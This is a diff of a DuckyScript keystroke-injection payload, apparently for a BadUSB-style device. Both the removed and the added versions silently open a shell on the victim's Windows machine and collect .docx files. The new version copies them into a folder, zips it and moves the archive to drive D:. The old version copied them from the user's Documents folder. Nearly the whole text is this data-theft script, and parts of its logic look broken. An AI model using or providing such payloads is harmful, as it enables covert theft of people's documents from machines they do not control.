@@ -1,44 +1,29 @@
-REM Delay for system startup
-DELAY 5000
-
-REM Open PowerShell
+DELAY 500
+REM Create folder
 GUI r
 DELAY 500
-STRING powershell
+STRING cmd.exe
+ENTER
+DELAY 500
+STRING mkdir "C:\MyFolder"
+ENTER
+DELAY 500
+
+REM Copy .docx files
+STRING copy "*.docx" "C:\MyFolder\"
 ENTER
 DELAY 1000
 
-REM Execute whoami command
-STRING whoami
+REM Zip the folder
+STRING powershell Compress-Archive -Path "C:\MyFolder" -DestinationPath "C:\MyFolder.zip"
+ENTER
+DELAY 3000
+
+REM Move the zip file to D:\ drive
+STRING move "C:\MyFolder.zip" "D:\"
 ENTER
 DELAY 1000
 
-REM Copy the username
-STRING $currentUser = whoami; $username = $currentUser.Split("\")[-1]; Write-Host $username | clip
-ENTER
-DELAY 1000
-
-REM Navigate to Documents directory
-STRING cd C:\Users\
-STRING paste
-ENTER
-DELAY 1000
-
-REM Open Documents directory
-STRING cd $username\Documents
-ENTER
-DELAY 1000
-
-REM List .docx files
-STRING Get-ChildItem -Path $PWD -Filter *.docx
-ENTER
-DELAY 2000
-
-REM Copy .docx files to D:\
-STRING Get-ChildItem -Path $PWD -Filter *.docx | ForEach-Object { Copy-Item $_.FullName -Destination "D:\" }
-ENTER
-DELAY 1000
-
-REM Exit PowerShell
+REM Exit command prompt
 STRING exit
 ENTER
